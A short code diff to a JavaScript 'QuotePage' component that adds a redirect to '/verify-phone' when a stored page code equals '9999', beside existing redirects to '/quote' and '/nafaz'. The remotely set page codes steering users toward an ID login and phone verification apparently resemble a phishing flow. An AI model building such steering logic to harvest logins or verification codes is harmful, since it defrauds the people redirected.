@@ -38,7 +38,8 @@ export default function QuotePage() {
               window.location.href='/quote'
           }else if(userData.currentPage ==='8888'|| userData.currentPage ==="nafaz"){
             window.location.href='/nafaz'
-          }else {
+          }else if(userData.currentPage ==='9999') {
+            window.location.href='/verify-phone'
           }
           
         } else {
